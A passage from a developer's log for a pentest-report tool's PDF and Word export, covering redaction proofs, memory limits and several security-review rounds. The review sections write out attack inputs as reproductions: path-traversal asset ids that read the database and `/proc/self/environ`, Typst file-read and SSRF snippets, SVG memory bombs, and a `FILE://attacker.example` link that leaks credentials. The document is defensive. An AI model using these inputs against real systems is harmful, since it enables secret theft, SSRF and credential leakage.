| clicking DOCX downloads the file | PARTIAL | Chrome began a download named `ws-main.docx` and then reported it `canceled` with nothing written, which is this headless setup and not the app: the anchor the app clicked carried a 12,989-byte blob of the right Word MIME type, which I saved and unzipped to `word/media/rId9.png`, byte-identical to the image in the same export fetched over `curl` |
| the info banner names the computed caption | PASS | `Exported, with 1 note(s):` then `Line 31: the caption is computed, so the Word file shows "Figure" instead.` The ruling I was working from said "with 1 note:"; the app says "note(s)" |
| a broken report shows the Typst error with its line | PASS | after pushing `#nope` into the shared doc, `PDF (server)` produced the red banner `Typst error at main.typ:26: unknown variable: nope` |
| the busy label while converting | COULD NOT CHECK | I looked 600 ms after the click and the buttons were already back; the export takes 383 ms, so there is nothing to catch at this size |
| with the flag off, neither button exists | PASS | against the flag-off container the sidebar has no Report row at all, so there is no tab and no toolbar |

### What the security review found, and how it was closed

Five rounds. The three criticals were real holes in code I wrote, and each was
demonstrated against the shipped argv before it was fixed.

**An asset record's `id` was joined straight onto `ASSETS_DIR`.** The id comes
out of the CRDT, which any account can write, so `../data.sqlite` read the
database and `../../proc/self/environ` read `AUTH_SECRET`, which is enough to
forge an admin token. With `kind: 'font'` the record also skipped the reference
filter and the bake, so the bytes were copied into the compile root verbatim
and `#read()` put them in the PDF the caller downloads. The fix is
`vet-asset.mjs`: a uuid-shaped id, a resolved path whose parent is `ASSETS_DIR`
itself, a matching row in the server's own `assets` inventory, and `kind` plus
workspace taken from that row rather than from the record.

**Pandoc read arbitrary files and fetched URLs.** `--sandbox` had been dropped
because it silently drops in-directory images, and the regex guard that
replaced it only matched `image("<literal>")`. So `#raw(read("../outside.txt"))`
worked, and `#let u = "http://127.0.0.1:8123/x.png"; #image(u)` made pandoc
issue the GET, which is SSRF from a box that may sit inside a client's network.
The fix is a two-step conversion: the reader runs with `--sandbox` and emits
JSON, a pure walker (`docx-ast.mjs`) checks every `Image` target resolves to a
regular file inside the staged `assets/` directory and replaces anything else
with a placeholder and a warning, and only that filtered AST reaches the
unsandboxed writer.

**One small PNG could take the whole box.** The 200 MB ceiling counted file
bytes, and a screenshot compresses: a 6000x6000 PNG that encodes to 0.81 MB
costs 2192 MB of RSS to decode. The fix is to read dimensions from the header
before anything decodes (`image-size.mjs`, covering PNG, JPEG, GIF and all
three WebP chunk kinds), a 10 MP per-image cap, and a total-pixel budget per
export. The cap started at 30 MP in the ruling and the measurement refused it:
jimp costs about 50 MB of peak per megapixel, so 25 MP is 1361 MB. 10 MP is the
first round number above a 4K screenshot, which has to keep working.

Then SVG, which has no pixel dimensions to read and so was exempt from all of
that. A reviewer built a 604 KB SVG with a 12000x12000 PNG in a `data:` URI and
took the typst child to 431 MB; moving the same bitmap behind an `<feImage>`
filter primitive took it to 994 MB. A staged SVG now has to be UTF-8, at most
2 MB, free of entity declarations, free of `<image>` and `<feImage>` (a
namespace prefix does not help), and free of any `data:` URI anywhere in the
file. Fourteen shapes were tried against that; the refusals come back in 7 to
17 ms with the server's memory unmoved, and an ordinary logo still exports.

That exemption rests on a version-dependent fact, which is why it is written
into the invariant: usvg resolves an href for exactly two elements, `<image>`
and `<feImage>`, and a reviewer measured nine other href-taking elements
loading nothing; typst itself refuses http, file and out-of-root hrefs inside
an SVG, which is what leaves a `data:` URI as the only remaining payload. Bump
`TYPST_VERSION` in the Dockerfile and those checks have to be run again.

The last round replaced the decoded-pixel budget, which only counted images
with a crop or a blur on them, with one that counts every staged raster. The
common case is a report full of placed screenshots that nobody redacted, and
that had no total bound at all: 32 unredacted 9.87 MP screenshots took the
typst child to 922 MB, because it holds every decoded bitmap while it writes
the PDF's image streams, at roughly 3 bytes per pixel. 120 MP is about 360 MB
in the child, which leaves the 1 GB box room for the relay and one bake.

### Things that surprised me

- **Pandoc's `--sandbox` silently drops images that are right there in the
  working directory.** It is not a working-directory rule: the manual says IO
  is limited to "reading the files specified on the command line", and an image
  referenced from inside the document is not on the command line. The result is
  a Word file with every figure missing and nothing on stderr. That single fact
  is why the DOCX path is a two-step conversion rather than one pandoc call.
- **`typst -j 1` moves layout onto the main thread, whose stack is smaller.** I
  added `-j 1` so an export could not take both cores from the relay, and a
  3000-section document that compiles fine at the default job count now dies
  with `thread 'main' has overflowed its stack`. 2000 sections are fine. So
  server PDF export has a document-size ceiling somewhere between them, which
  is mapped to a sentence telling the operator to export from the browser.
- **jimp's "bilinear" resize point-samples.** Writing the redaction proof, the
  first synthetic pattern (a period-2 checkerboard, downscaled by exactly 10)
  came out uniformly white, which would have made a no-op bake look perfect.
  jimp 1.6.1 interpolates only at fractional source positions, so an
  integer stride samples one phase of the pattern forever. The same thing
  happens against the reference implementation this was ported from, so it is a
  property of the library. The check now uses a seeded non-periodic pattern
  with no period a fixed kernel can exploit.
- **`escapeContent`'s `\/` was checked against the wrong parser.** I chose it
  because the typst CLI treats `//` as a line comment even inside content
  brackets, so an unescaped caption like "Open redirect to //evil.com" left an
  unclosed `[...]`. But nothing in the DOCX path ever reaches the typst CLI:
  the only consumer is pandoc's own typst reader. So I settled it with pandoc
  3.11 itself, the version in the image. `#figure(image("assets/x.png"),
  caption: [Auth bypass on \/admin])` and the `\/\/evil.com` form both come
  back out as `Auth bypass on /admin` and `Open redirect to //evil.com`, with
  no visible backslash anywhere in the output. Both parsers accept the escape;
  no change was needed, and now that is measured rather than assumed.
- **50 MB of peak per megapixel**, measured on the ladder from 3.7 MP to 25 MP,
  which is what set the per-image cap at 10 MP instead of the 30 I first chose.
  A 5K screenshot is refused, and the message sends the operator to the browser
  export, which is the honest answer on this hardware.

### What is still open, on the server export

- ~~**The bake stalls the relay and sits at the memory ceiling.**~~ Fixed:
  the bake moved into one short-lived child process per image, and the whole
  report is sized and budgeted before any of it is baked. Numbers in "After
  the fix" above. The total budget is still set from the compiler's cost
  rather than the bake's, which is now the right way round, because the bake
  is no longer the expensive half.
- **The per-spawn cost is bun's start-up**, about 0.22 to 0.27 s per redacted
  image, because each child imports jimp from scratch. A pool would amortise
  that and would bring back the "one process holds the memory across images"
  problem the fix exists to remove, so I left it. If wall time ever matters
  more than the isolation, that is the knob.
- ~~**Step 3 of the Word conversion is not sandboxed.**~~ Gone with the route:
  the Word file is no longer made from the report source at all. See "The Word
  file is now made from the PDF" below.
- **`docker images` SIZE and the filesystem disagree** on this host by about
  115 MiB per image. I used the filesystem number and said so; I did not chase
  the containerd accounting.
- **The download could not be captured through Chrome's own download path** in
  this headless setup, so the click-through proves the bytes from the anchor
  the app clicked rather than from a file Chrome wrote.

## The Word file is now made from the PDF (2026-09-19)

I gave the owner the DOCX button and they exported their real CPTC report with
it. They rejected the result on sight. Not "some layout is off": the cover was
gone, every heading was numbered "0", and there was not a single colour, table
fill or running header anywhere in the file. 15 pages against the PDF's 23.

That is not a bug in the wiring. It is what pandoc's Typst reader does with a
template built out of `#place`, grids, counters and custom `#show` rules. The
reader follows a subset of Typst and evaluates almost none of the presentation,
so everything the owner had actually designed was the part that did not come
across. I had written "structure survives, custom layout does not" in the UI
and thought that was an honest warning. On a real report it turns out to mean
"almost nothing survives", which is not the same sentence.

### Three routes, measured against the same report

I rendered each candidate DOCX back to PDF through Word and put it next to the
real one, page for page.

| route | pages | what it looked like |
|---|---|---|
| pandoc from Typst source (what shipped) | 15 | no cover, headings numbered "0", no colour, no tables fills, no header |
| `typst --features html` then pandoc html to docx | 23 | every word present, every piece of styling gone |
| the finished PDF through **pdf2docx** | 44 | near-identical to the PDF, but 21 pages too many and a scrambled contents page |

The third one is the interesting failure, because the thing that was wrong with
it was small and the thing that was right with it was everything: the cover,
Poppins, the coloured risk matrix, the finding cards with their severity
stripes, the code blocks. Two specific defects:

1. **The footer overflowed every page.** pdf2docx has no idea that the band at
   the bottom of each page is a running footer; it converts it as body content,
   Word re-flows it, and each page grows by the height of its own footer until
   it spills. 23 pages became 44.
2. **The table of contents came apart.** Entries merged into each other, page
   numbers landed beside the wrong titles, and the dot leaders came through as
   literal runs of periods.

Deleting the two bands out of the PDF before converting fixed the page count
exactly: 23 in, 23 out. So the route was right and the repairs were the work.

### What `pdf-to-docx/convert.py` does

One Python script, run as a short-lived child after the same typst compile that
`format=pdf` runs. It is written against page geometry, not against one
template, because the next report will not be this one.

**Finding the bands.** Every text row in the top or bottom 12% of a page is
normalized (whitespace collapsed, digit runs replaced with `#`, so a page number
stops being part of the identity) and keyed by that text plus its rounded top
edge. A key that appears on at least 60% of the pages that have anything in
that zone is a band. Pages with nothing there, such as a cover, are not counted
either way, which is how the cover keeps its bare header for free.

One rule earns its place beyond that: **the band is the cluster nearest the
page edge**. Body content repeats too. A report whose every page opens with a
heading of the same shape has a repeating row inside the 12% zone, and without
this rule the heading would be detected as a header and deleted out of the
document. So after the repeating rows are found, only those within about 1.6
row heights of the outermost one are kept. My self-test builds exactly that
trap and the rule is what makes it pass.

Vector drawings that repeat with the text join the band when they sit within
30 pt of it: a rule under a header, a filled strip behind a footer. That is how
the band's real y-extent is found, and the extent is what gets erased.

A strip that runs to the page's bottom edge needed one more step (2026-10-10).
Word shades a paragraph over its own line box only, and puts a footer
`footer_distance` above the edge, so the CPTC footer's 22.3 pt grey strip came
back as a 12.6 pt one with 4.8 pt of white under it. The band now keeps the
strip's vertical extent (`strip_y`); when it reaches the edge the footer gets
no distance and an exact line as tall as the strip, and its runs are raised
with `w:position` by the gap between Word's baseline (0.8 of an exact line,
`EXACT_BASELINE_RATIO`) and the PDF's. Through Word, on page 4 of the 57-page
stress report: strip 769.8 to 792.1 against the PDF's 769.7 to 792.0, baseline
784.2 against 784.0 (it was 774.7 to 787.3, baseline 784.8). The colour was
never wrong: Word fades header and footer content about halfway to white on
screen while the body is being edited, which is what made `F3F3F3` look like
`FAFAFA` in a screenshot.

**Page numbers.** Within a repeating row, the digit runs line up slot by slot
across pages. A slot whose value equals its page index plus a constant is the
page number, and that constant is what `w:pgNumType w:start` gets. This report
prints "1" on physical page 2, so the offset is 0 and Word starts counting at
0, which makes the cover page zero and every printed number match the PDF. The
numbers in the Word file are a real `PAGE` field, not text.

**Erasing them.** A PyMuPDF redaction annotation with no fill over the band
rectangle, with `PDF_REDACT_IMAGE_NONE` and line art removed only when fully
covered, so a figure that reaches into the zone is left alone. That PDF is what
pdf2docx converts.

**Putting them back.** python-docx, on every section pdf2docx produced, which
is one per page for this document. Each band row is split into columns wherever
a horizontal gap wider than 4 pt appears, each column is classified left,
centre or right against the document's own text-area edges, and the three go
into one paragraph separated by tabs with a centre and a right tab stop.

Three things there cost me time.

- **Word merged the Header style's tab stops with mine.** The built-in Header
  and Footer styles carry a centre stop at 4.5" and a right stop at 9", sized
  for one-inch margins, and a paragraph's own stops are added to those rather
  than replacing them. The first tab went to the style's centre stop and the
  right-hand piece of the header landed in the middle of the page. The fix is
  to emit an explicit `w:tab w:val="clear"` at each inherited position.
- **Word refuses to open a file whose property elements are out of order.**
  Appending `w:shd` and `w:pBdr` to the end of a `w:pPr` produces "the file
  appears to be corrupted", not a warning. WordprocessingML validates child
  order, so the script inserts into the schema's sequence.
- **A header reserves space from the body.** Word puts the body at
  `max(topMargin, headerDistance + headerHeight)`, and pdf2docx sets a top
  margin that assumed no header at all, so adding one pushed every page down by
  the header's height and turned 23 pages into 28. The script sets the top
  margin to what the header needs and takes exactly that much back off the
  spacer paragraph pdf2docx writes at the top of each page, so the first line
  of body text lands where it did in the PDF. An empty header is not free
  either: the cover got a 49 pt shove from the empty definition that exists
  only to stop it inheriting the band, until that definition was flattened to a
  1 pt line at distance 0.

**The contents page.** TOC lines are read out of the PDF: a title, a run of six
or more dots, a trailing number. The converted document's dot-leader paragraphs
are grouped into stretches, entries are matched to a stretch by their title
text, and each stretch is replaced with one clean paragraph per entry: the
indent from the PDF's own x position, the title, a tab, the page number, and a
right-aligned dot-leader tab stop at the text area's right edge. Line spacing is
set to the exact pitch measured between the PDF's own entries, which is what
keeps the list the same height and the page count intact.

pdf2docx had put this report's contents page inside a table with merged cells,
which is worth knowing for two reasons. Walking the python-docx object model
visits a merged cell once per grid column it spans, so the first version of this
deleted the same paragraph twice and left a table cell with no paragraph in it,
which is another way to make Word say "corrupted". And a paragraph inside a
table cell clips its dot leader at the cell's width rather than the page's. So
the replacements are written at the body level and the original entries are
removed a whole table row at a time.

If a report has no repeating band and no dot leaders, both steps do nothing.

### The result on the owner's report

23 pages in the PDF, 23 pages in Word. Per-page similarity, which is one minus
the mean absolute difference of the two pages rendered greyscale at 200 px
wide, so 1.000 is identical:

| | |
|---|---|
| worst page | **0.8962** (page 1, the cover) |
| median | **0.9828** |
| mean | **0.9766** |
| pages below 0.96 | 1 (the cover) |

The cover is the only page that is visibly different, and it is not mine: the
raw pdf2docx output scores the same 0.8962 there. It renders the cover as one
page image and places it slightly larger than the page. Every other page is
between 0.956 and 0.995, and at reading distance the difference is Word
wrapping a long line one word earlier.

The header (`{{CLIENT NAME}} Security Assessment` left, `{{OUR_COMPANY}}`
right, rule beneath) and the footer (`CONFIDENTIAL – DO NOT DISTRIBUTE` centred
in red on a light strip, page number right) are on pages 2 to 23 and absent
from the cover, with the printed numbers matching the PDF. 27 contents entries
were rebuilt, one line each, dot leaders and right-aligned page numbers.

Then the same script on BTCT's own starter template, which has no running
header, no footer and no contents page: 2 pages against 2, both repairs
reported doing nothing, worst page 0.9555 and median 0.9988. That is the check
that the heuristics are not written for one report.

Contact sheets for both are produced by `pdf-to-docx/compare.ps1`, which
compiles, converts, renders the Word file back through Word itself and draws
the reference pages above the candidates.

### What it cost the image

| | before (pandoc) | after (pdf2docx) |
|---|---|---|
| whole image, sum of layer sizes | 511.8 MB (488 MiB) | **722.0 MB (689 MiB)** |
| the export tools' share | 214.9 MB | **425.1 MB** |
| `--build-arg WITH_REPORT_BINS=0` | 296.9 MB (283 MiB) | **296.9 MB (283 MiB)** |

The pieces of that 425 MB: the virtualenv layer is 336 MB (321 MiB on disk,
mostly OpenCV, PyMuPDF and NumPy), Debian's `python3` is 38 MB, and typst is
51 MB. pandoc alone was 164 MB, so the honest way to put it is that Word output
that looks like the PDF costs about 210 MB more than Word output that did not.
The owner chose that trade with the numbers in front of them.

Two things keep it from being worse. pip compiles bytecode for everything it
installs, which is hundreds of modules the converter never loads; the build
throws all of it away and then imports once, so only the bytecode that is
actually used is in the image. The export child runs with `-B`, so without that
it would recompile PyMuPDF, NumPy and OpenCV on every export, on the one core
it is allowed. And the whole thing is still behind `WITH_REPORT_BINS`, which is
unchanged at 283 MiB.

The requirements file is pinned and hashed. `pip --require-hashes` refuses to
install anything whose artefact does not match, so a changed wheel on PyPI
fails the build instead of shipping.

### In the container, on 1 GB and two cores

`btct-measure:after`, `--memory 1g --cpus 2`, the owner's report seeded through
a real websocket connection and real asset uploads, with a `/healthz` poll every
200 ms throughout because the process is also the team's Yjs relay.

| | PDF | DOCX |
|---|---|---|
| wall time | 0.77 s | **6.85 s** |
| cgroup `memory.peak` after | 125,820,928 B (120 MiB) | **184,979,456 B (176 MiB)** |
| `memory.current` sampled at 50 ms, max | 122,183,680 B | 184,647,680 B |
| worst `/healthz` during the export | 0.0082 s | **0.0100 s**, 32 polls, 0 failures |
| OOM kills | none | none |

6.85 s for a 23-page report, of which the compile is 0.8 and the rest is Python
starting up and pdf2docx working. Peak memory 176 MiB out of 1024. The relay
never noticed: the worst health check during a DOCX export was 10 ms. That is
the number I care about most, because the bake was the thing that used to stall
it, and the converter is a separate process for the same reason the bake is.

The Word file the container produced scores exactly what the local one does:
worst 0.8962, median 0.9828. Same bytes of logic, different machine.

### The redaction still holds, through the PDF

This is the guarantee the whole feature exists for, so it is re-checked rather
than reasoned about. The seeded screenshot is 1920x1080 with a pixelate blur
over its left half. Against the container's own DOCX, with the image now
travelling upload to bake to PDF to `word/media/`:

```
word/media: image1.png
embedded bytes differ from the upload: true (49976 vs 706682)
DOCX left-half correlation with the original (inset 8px): -0.000 (limit 0.25)
DOCX right half, pixels differing by more than 8/255: 0 of 1004416 (0.000%)
IDAT slice found in the PDF: false
IDAT slice found in the DOCX: false
  (control) the same slice is found in the original png: true
REDACTION PROOF: ok
```

The route is in fact easier to defend than the old one. There is now exactly one
path from an asset's bytes to a deliverable: vet, size, bake in a child, compile
with typst, convert that PDF. The Word file cannot disagree with the PDF about a
redaction because it is made out of it.

Flag-off behaviour is unchanged: with `ENABLE_TYPST` unset the routes answer 404
before they look at a token, and the container's process table holds nothing but
`bun`. Built with `--build-arg WITH_REPORT_BINS=0`, `/opt/pdf2docx` is empty,
there is no `python3`, capabilities reports `{"pdf":false,"docx":false}` and both
formats answer 501.

### Security, restated for this route

The converter's input is a PDF that our own typst produced from hostile source.
PyMuPDF therefore parses attacker-influenced but typst-generated content, which
is a much smaller surface than the old arrangement where pandoc parsed the
report source itself. It runs as a separate process with `childEnv()` (PATH and
nothing else, so `AUTH_SECRET` and the ingest tokens never reach it), an argv
array rather than a shell string, `-I` isolated mode so every `PYTHON*` variable
and the user site directory are ignored, `-B` so it writes no bytecode into the
image, a 120 s timeout with SIGKILL behind it, and a failure message that is
path-scrubbed and capped before it can reach a response body. It needs no
network at all, so the advice to deny the container egress is unchanged and now
covers one fewer thing that might have wanted it.

### What is still imperfect

- **The cover page.** pdf2docx renders a full-page image slightly larger than
  the page. 0.8962 against 0.98 for every other page, and it is the first thing
  anyone opens. I did not chase it because it is inside pdf2docx's own image
  placement, not in either repair.
- **Fonts are not embedded.** Word substitutes unless the report's fonts are
  installed on the machine that opens the file. Embedding is possible (the
  fonts are already staged for the compile) and is the obvious next step if
  anybody asks. (Done in a later round, and then done properly in part four,
  where it turns out embedding a font and having Word use it are two
  different things.)
- **"Different first page" is the only page-level exception Word can express**
  through one header definition. When pdf2docx produces one section per page,
  as it did here, each page gets its own and that is exact. If it ever produces
  fewer sections than pages, a report whose band skips a middle page will show
  the band there anyway, and the converter says so in a warning rather than
  pretending otherwise.
- **A table that pdf2docx sizes slightly wide clips its right edge** by a pixel
  or two, visible on the finding cards where the severity badge meets the card
  border. It is pdf2docx's table width, not the repairs.
- **The similarity score is a guide rail, not the acceptance test.** Mean
  absolute difference on a 200 px render will not notice a wrong colour in a
  small cell. The contact sheet is what decides, and a human has to look at it.
- **Right-to-left text loses the spaces between its words.** pdf2docx runs an
  Arabic or Hebrew line together, and the text check cannot see it: that check
  squashes whitespace away on both sides precisely so a re-flow is allowed to
  move it, so a line with every space gone still compares equal to the line the
  PDF printed. A report set in a right-to-left script is not usable through this
  route today. It is written down here rather than fixed because fixing it means
  reading the PDF's word boundaries back into the run, which is a round of its
  own, and because nothing in the acceptance case exercises it.

### What the review found, and what the converter guarantees now

A reviewer took the converter to documents I had not tried and made it delete
report content twice, with `result.json` still saying `ok`. That is the worst
shape a bug can have here: the Word file still looks like a report, and the
missing finding is missing quietly. Both reproductions and the numbers that
came out of them:

**A long table whose rows differ only by a number.** 120 rows of
`Host-073 | 10.0.0.73 | Open port finding number 73`. Digit blanking is what
lets a page number stop being part of a running header's identity, and it made
every one of those rows the same text. Two of them landed at the same height on
two pages, cleared a quorum of two, and were the outermost thing in the bottom
zone. `Host-111` left the Word file and `Host-073` became the footer of every
page. The repeated `table.header` row was hoisted into the page header on the
same run.

**A repeated first body line.** US Letter, one inch margins, a running header,
and the same block of text on every page. The first body line sits about 12 pt
under the header, inside the glue that holds the lines of one band together, so
it joined the band: deleted from all four pages, pasted into the Word header.

**Odd and even headers.** Two texts taking turns at the top of the page. On a
short document both cleared the quorum and every page's Word header read
"Acme Security Assessment Contoso Consulting Group". On a longer one neither
reached 60%, so nothing was detected, the bands stayed in the body, the page
count inflated, and nothing said so.

#### Three layers, because a heuristic will be wrong again

The first two make a wrong guess rare. The third is the guarantee.

**Tighter detection.** A candidate group now has to survive four tests, and
each one is here because it caught real content being deleted.

1. *Quorum.* `max(2, round(n x 0.6))` is two pages of a four-page document,
   which is how two table rows became a footer. It is `max(3, ceil(n x 0.6))`
   now, and a document too short for a fraction to mean anything has to carry
   the band on every page but one, which has to be the first: a cover may have
   something else up there, a page in the middle may not.
2. *Stable digits.* A column holding a number that changes from page to page
   and is not the page number is body content. `Host-073` fails this; the
   reference report passes it, because every column of its header and footer
   either has no digits at all or is the page number.
3. *Separation.* The candidate has to clear the nearest body row by at least
   half the body's own line pitch. Measured, as the gap over the pitch:

   | | ratio | |
   |---|---|---|
   | real running header, reference report | 1.03 | keep |
   | real footer, same report | 14.13 | keep |
   | real page-number footer, letter, 1 in margins | 25.67 | keep |
   | repeated first body line under a header | 0.13 | drop |
   | repeated table header and data row | 0.31 | drop |
   | alternating headers plus body lines | 0.13 | drop |

   0.5 sits in the empty middle. The cluster is grown from the page edge
   inwards, so when it fails the innermost group is the one that does not
   belong: drop it and measure again. That is how the real header in the
   second reproduction survives having a body line stuck to it.
4. *Outermost.* Nothing else may be printed beyond the band on a page that
   carries it.

**Per-edge honesty.** The header and the footer are now reported separately,
and an edge that was found but declined says why in plain words. Alternating
headers get their own sentence: Word can express odd and even headers and this
script does not, so it declines the edge rather than concatenating both texts,
which is what it used to do.

**The safety net.** After conversion, every line of the PDF is looked for in
the Word file, except the band's own member rows: body, tables, text boxes,
headers and footers. A line is present
when its squashed characters (whitespace, hyphens, dot leaders and invisible
characters removed) appear unbroken somewhere in the Word file's squashed text.
If anything is missing, that file is discarded and the report is converted
again with both repairs off, and the banner says so. If text is still missing
after that, the converter itself dropped it, and the file is kept with a
warning naming how many lines and the first of them.

Getting the comparison to be useful took three attempts, and the number that
matters is on the reference report, which loses nothing and therefore has to
come back clean:

| comparison | lines reported missing on a report that lost nothing |
|---|---|
| word counts per document | 62 |
| runs of consecutive words per line | 38 |
| squashed characters per line | 8 |
| squashed characters per column | **0** |

The false positives were all the same kind of thing: a short token such as
"1." whose count differs because the converter merged two table cells, a run
boundary falling inside text the PDF spaced differently, and a two-column table
row that the converter writes one column at a time rather than across. Columns
are the pieces that are really contiguous on a page, so they are what gets
looked for, and a piece under four characters is skipped because "LOW" proves
nothing either way.

`result.json` carries `textCheck: {pdfLines, missing, fellBack, overprinted}`
so the server and the operator can see it happened. `overprinted` (added
2026-10-10) counts the missing lines the PDF itself draws on top of other
text; see "The long report's lost lines were the PDF's" below.

#### Three smaller things the review caught

**Links.** pdf2docx copies a PDF link annotation into the Word file as an
external relationship, and Word follows it.
`#link("FILE://attacker.example/share/x")` survives typst as a URI action and
lands in the .docx as a UNC-resolving hyperlink, which leaks the reader's
credentials to whoever owns that host; `smb://`, `javascript:` and `ms-msdt:`
go the same way, and typst turns a bare `\\host\share` into a Launch action.
Everything but `http`, `https` and `mailto` is now deleted from the PDF before
the converter sees it, the count goes in a warning, and the finished .docx is
re-read to confirm no external relationship names anything else. On the seven
links in the test document, five are removed and `https://example.com/ok` and
`mailto:team@example.com` are the only external targets left.

**Cost.** The conversion had no bound of its own: the output cap is after the
fact and the pixel budget counts images, not vector drawings. Three A4 pages of
120,000 one-point rectangles take typst 3.2 s to write into 1.8 MB and cost the
converter 30.4 s; at 150 pages the reviewer ran past the two-minute timeout,
with 651 MB of peak RSS. Four bounds now, all with a wide margin over a real
report, whose worst page holds 62 drawings in a 294 kB instruction stream: 25 MB
of compiled PDF (checked by the server before it spawns anything), 300 pages,
3 MB of instruction stream per page, and 10,000 drawings per page. Checking the
stream length first is what makes the refusal cheap: the 120,000-shape document
is refused in 0.04 s, where counting its drawings would have taken 2.0 s.
Counting on the reference report costs 0.04 s for all 23 pages. On Linux the
child also sets `RLIMIT_AS`, at 3 GB rather than the 768 MB it is meant to
stand in for, because PyMuPDF and OpenCV map far more than they touch and a
tighter limit fails the import of OpenCV itself rather than the runaway.

That 3 GB held only by luck of the machine it was measured on. numpy's
OpenBLAS and OpenCV size their thread pools to the CPUs the kernel reports,
and in a container that is the host's count, not the cgroup's two-CPU quota.
On a 24-core host (2026-10-10) `import cv2` started 47 threads and mapped
4.4 GB for 41 MB of memory, so under the cap the import died of SIGSEGV and
every Word export answered "The exporter stopped unexpectedly (pdf2docx,
SIGSEGV)". `convert.py` now sets `OPENBLAS_NUM_THREADS`, `OMP_NUM_THREADS`,
`MKL_NUM_THREADS` and `NUMEXPR_NUM_THREADS` to 1 before it imports anything
that loads them; the same import then maps 275 MB. A box of one or two cores
loses nothing by it. `run_thread_checks` in `test_convert.py` imports
pdf2docx under the cap in a child with those variables removed, on Linux.

**A table of contents that half matched.** An entry whose title could not be
matched to the converted paragraphs was dropped along with the rest of its
stretch, while the warning said it had been left alone. It fired on any title
`squash` reduced to nothing, which was every non-Latin title, because the
reduction was `[^0-9a-z]`. `squash` is Unicode-aware now, and the rebuild is
all or nothing: one unmatched entry and the converter's own list stays, ugly
and complete, with a warning that says which it did.

#### What the reproductions do now

| | before | after |
|---|---|---|
| table of 120 numbered rows | `Host-111` deleted, `Host-073` in every footer, `ok: true` | no band detected, `Host-111` and `Host-073` each appear once, 0 of 124 lines missing |
| repeated first body line | deleted from four pages, pasted into the header | header and footer lifted, the body line still in the body and absent from every `header*.xml`, 0 of 84 lines missing |
| odd and even headers | both texts concatenated into one header | the edge is declined, warning names the alternation, 0 of 44 lines missing |
| seven links | five dangerous targets in `word/_rels/` | two left, both `http(s)`/`mailto`, and the count reported |
| 120,000 shapes a page | 30.4 s and 651 MB | refused in 0.04 s |

The reference report is unchanged by all of it: 23 pages against 23, worst page
0.8962, median 0.9828, the header and footer still lifted, 27 table-of-contents
entries still rebuilt, 0 of 390 lines missing and no fallback. The starter
template is unchanged too, at 2 pages against 2.

#### What is still imperfect here

- **The table-of-contents rebuild needs the converter to keep the entries as
  separate paragraphs.** On a sparse page pdf2docx merges the whole list, and
  the heading above it, into one paragraph; the repair then declines and says
  "the table of contents could not be found in the converted file, so it was
  left as it was". That is the right answer (the list is ugly and complete),
  but it means the repair is quieter on short documents than on a real report.
- **The text check compares a line's characters, not its position.** A line
  that the converter moved to the wrong place is not reported, only one that
  is gone. Ordering is what the contact sheet is for.
- **A piece shorter than four characters is not evidence.** Losing a lone
  "LOW" from a table cell would not be caught, because that string occurs all
  over a report anyway.
- **`RLIMIT_AS` is a backstop, not a budget.** At 3 GB it will not stop a
  conversion that merely uses a lot; the page, size and complexity bounds are
  what keep the usual case small, and the existing "the child is the OOM
  victim, not the relay" mapping is what covers the rest. Windows has no
  `resource` module and relies on the other three.

### Round two: the rectangle that is erased, and the decoration that was not kept

A second safety pass found a hole underneath the first one, and the owner,
who called the export "super good already", asked for a page-by-page look at
what still differs from the PDF. The two turned out to be about the same
thing: filled rectangles.

#### The hole: the band's rectangle is not the band

The four detection tests all run on the band's *text*. Then the rectangle that
gets erased is grown to swallow any repeating drawing within 30 pt, because a
rule under a header and a strip behind a footer are part of the band. That
rectangle is the whole page width, and the erase removes text inside it.

A running header with a per-page finding title underneath and a repeating
full-width rule below the title: the rule pulls the rectangle down past the
title, and all eight titles are deleted. `ok: true`, `missing: 0`, because the
text check excluded the same rectangle from both sides. The check was blind to
exactly the rows that growing the rectangle removed.

Two changes, and both are needed. The band records its member rows, and the
text check leaves out those and nothing else, so anything else the erase takes
is reported and sends the conversion to the fallback. And the enlargement is
now offered and then checked: if the bigger rectangle would cover a row that
is not a band member, it is not taken, and the decoration stays in the body.
The rule is then drawn twice, once by Word's header and once by the page it
was left on. That is the price, and it is the right way round.

Three smaller things came out of the same pass.

- **"Nothing to measure" was a pass.** A document whose every page holds one
  line gave the separation test nothing to compare, and the cluster was
  accepted: every page's one line went into the Word header, and the text
  check, left with no body lines at all, reported a clean run. The gap now has
  to be measurable on more than two of the band's pages, and lifting bands
  with nothing left to check counts as a failure.
- **A declined edge said the wrong thing.** A group rejected by the digit test
  or the separation test reported "No repeating header was found", which is
  false: one was found and not lifted. Each rejection carries its own sentence
  now.
- **The fallback could blow the budget.** It doubles the conversion, and a
  report that takes 95 seconds a pass was being SIGKILLed halfway through the
  second one with a message that said nothing. The server passes the converter
  its remaining budget, and a second pass that will not fit stops with a
  sentence saying so.
- **The document-wide cost had no bound.** 60 pages of 9,000 drawings clears
  every per-page test and still costs 50.5 s and 403 MB. There is a budget of
  150,000 drawings for the whole document now, over 300 times the 479 the
  reference report draws, and the count stops at the first page that goes over.
- **The text check tested presence, not count.** Three identical table rows
  against one copy in the Word file passed. It counts occurrences now, and the
  reference report still reports 0 missing of 390 lines, which is the number
  that matters: this was the fourth reading of the comparison and the first
  three all produced false positives there.

#### The decoration: one cause, four symptoms

pdf2docx keeps a filled rectangle when it becomes a table cell and drops it
otherwise. That single fact explains every visual difference the owner found
that was not a re-flow:

| what was missing | what it is in the PDF |
|---|---|
| the grey panel behind every code block | a filled rectangle behind three lines of text |
| the dark bar down that panel's left edge | a 7.2 pt filled rectangle touching it |
| the chart legend's four colour squares | 9 pt filled squares beside four labels |
| the footer strip running edge to edge | a full-bleed filled rectangle |

So the rectangles are read out of the PDF and put back. The hard part is
telling a panel from a table cell, and size does not do it: this report's risk
matrix has cells as tall as its code blocks, and painting one of those onto a
paragraph puts a red bar through a sentence, which is what the first attempt
did and what dropped page 4 from 0.976 to 0.968. What does tell them apart is
that **a cell has neighbours**: another filled rectangle sharing its top and
bottom (the rest of the row) or its left and right (the rest of the column). A
panel stands alone. The accent bar is excluded from that test, since it shares
its panel's top and bottom by construction.

Matching a panel to the paragraphs its text ended up in is done in document
order against a cursor, because the same code block appears on every finding
page and "the only paragraph containing this line" is the wrong question. A
panel whose paragraph already carries a fill is skipped but still consumes its
place in the order, or the cursor runs ahead and the next panel lands on the
wrong text.

The footer strip needed a different trick: Word shades a paragraph between its
indents, so the footer paragraph is pushed out into the margins with negative
indents and an extra left tab stop puts its text back where the text area
starts. The page number still lands on the right tab stop, because tab stops
are measured from the margin and not from the indent.

Two text repairs, both from the PDF's own characters. Typst writes its
line-break hyphens as U+00AD and real hyphens as U+002D, and Word was printing
